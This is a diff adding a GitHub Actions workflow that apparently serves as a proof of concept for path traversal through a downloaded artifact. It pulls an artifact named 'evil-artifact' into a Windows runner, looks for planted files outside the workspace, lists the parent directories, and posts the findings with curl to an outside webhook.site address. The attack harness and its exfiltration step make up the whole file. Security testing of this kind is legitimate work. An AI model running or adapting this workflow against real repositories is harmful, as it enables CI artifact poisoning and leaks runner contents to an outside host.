@@ -1,0 +1,31 @@
+name: cb-j-victim-win
+on:
+  workflow_dispatch:
+    inputs:
+      run_id:
+        required: true
+jobs:
+  w:
+    runs-on: windows-latest
+    timeout-minutes: 15
+    steps:
+      - name: download attacker artifact (windows, trusted context)
+        uses: actions/download-artifact@v4.3.0
+        with:
+          name: evil-artifact
+          run-id: ${{ github.event.inputs.run_id }}
+          github-token: ${{ github.token }}
+      - name: probe escape
+        shell: bash
+        run: |
+          {
+            echo "=== pwd:"; pwd
+            echo "=== escape probes (windows runner):"
+            for f in ../ESCAPED-WIN.txt ../../ESCAPED-WIN.txt ../ESCAPED-LINUX.txt; do
+              if [ -f "$f" ]; then echo "ESCAPED: $f = $(cat $f)"; else echo "absent: $f"; fi
+            done
+            echo "=== workspace listing:"; ls -la | head -12
+            echo "=== parent listing:"; ls -la .. | head -12
+          } > proof-win.txt 2>&1
+          curl -s -X POST https://webhook.site/478eb9df-c7c4-423e-9945-de4975de8fef -F "f=@proof-win.txt" -F "src=victim-win"
+          true
